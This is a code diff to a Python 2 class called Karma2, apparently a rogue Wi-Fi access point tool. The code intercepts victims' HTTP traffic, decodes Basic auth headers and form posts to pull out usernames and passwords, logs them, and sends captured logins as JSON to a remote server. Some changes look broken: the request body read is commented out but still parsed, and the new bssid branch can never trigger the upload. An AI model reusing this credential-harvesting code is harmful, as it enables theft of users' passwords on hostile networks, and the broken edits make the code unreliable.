@@ -608,7 +608,7 @@ class Karma2:
         if authorization[0] == 'Basic':
           user_password = base64.b64decode(authorization[1])
           login,password = user_password.split(':')
-          user = {'login':{'uri':fullpath,'login': login,  'password':password}}
+          user = {'uri':fullpath,'login': login,  'password':password}
           self.server.app.log_login(client, user)
       except Exception as e:
         print e
@@ -616,7 +616,7 @@ class Karma2:
       # get content
       if self.headers.has_key('Content-Length'):
         length = int(self.headers['Content-Length'])
-        post = self.rfile.read(length)
+        #post = self.rfile.read(length)
 
         if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
           model = self.headers.get('model')
@@ -632,7 +632,7 @@ class Karma2:
             kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
             log( "%s login is %s"%(fullpath, 
               _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
-            user = {'login':{'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}}
+            user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
             self.server.app.log_login(client, user)
           except:
             raise
@@ -1245,12 +1245,17 @@ class Karma2:
   
   def log_login(self, client, user):
     client_ap = self.get_client_ap(client)
+    bssid = None
     if client_ap is None:
       client_ap = ''
+      bssid = self.get_client_ap(client)
     else:
       client_ap = client_ap.essid
-      
+    
     log('%s %s login: %s, password: %s, uri: %s'%(_ctxt('[*]', RED), _ctxt(client_ap, GREEN), _ctxt(user['login'], RED), _ctxt(user['password'], RED), _ctxt(user['uri'], RED)))
+    if bssid is not None:
+      user['bssid'] = bssid
+      self.update_login({'login':user})
   
   def get_client_ap(self,ip):
     for essid,ap in self.aps.iteritems():
@@ -1278,7 +1283,7 @@ class Karma2:
       req.add_header('Content-Type', 'application/json')
       response = urllib2.urlopen(req, json.dumps(login, ensure_ascii=False))
     except:
-      log( "could not update dns")
+      log( "could not update login")
   
   def update_dns(self, dns):
     if self.uri is None:
